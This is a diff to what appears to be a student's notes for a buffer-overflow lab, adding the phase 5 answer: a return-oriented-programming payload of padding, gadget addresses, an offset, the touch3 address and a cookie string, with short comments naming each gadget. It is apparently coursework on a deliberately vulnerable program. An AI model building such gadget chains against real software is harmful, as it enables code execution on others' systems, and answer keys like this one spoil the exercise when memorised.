@@ -87,3 +87,25 @@ addr to garget popq rax
 data to be popq and store to %rax
 addr to garget mov rax rdi
 addr to touch_2
+
+
+// phase_5
+
+key: use <add_xy> in source file
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* fill 0x00 */
+06 1a 40 00 00 00 00 00 /* mov $rsp,$rax */
+c5 19 40 00 00 00 00 00 /* mov $rax,$rdi */
+ab 19 40 00 00 00 00 00 /* pop $rax */
+48 00 00 00 00 00 00 00 /* offset */
+dd 19 40 00 00 00 00 00 /* movl $eax,$edx */
+34 1a 40 00 00 00 00 00 /* movl $edx,$ecx */
+63 1a 40 00 00 00 00 00 /* movl $ecx,$esi */
+d6 19 40 00 00 00 00 00 /* lea (%rdi,%rsi,1),%rax */
+a2 19 40 00 00 00 00 00 /* mov $rax,$rdi */
+fa 18 40 00 00 00 00 00 /* touch3 address */
+35 39 62 39 39 37 66 61 00 /* cookie value */
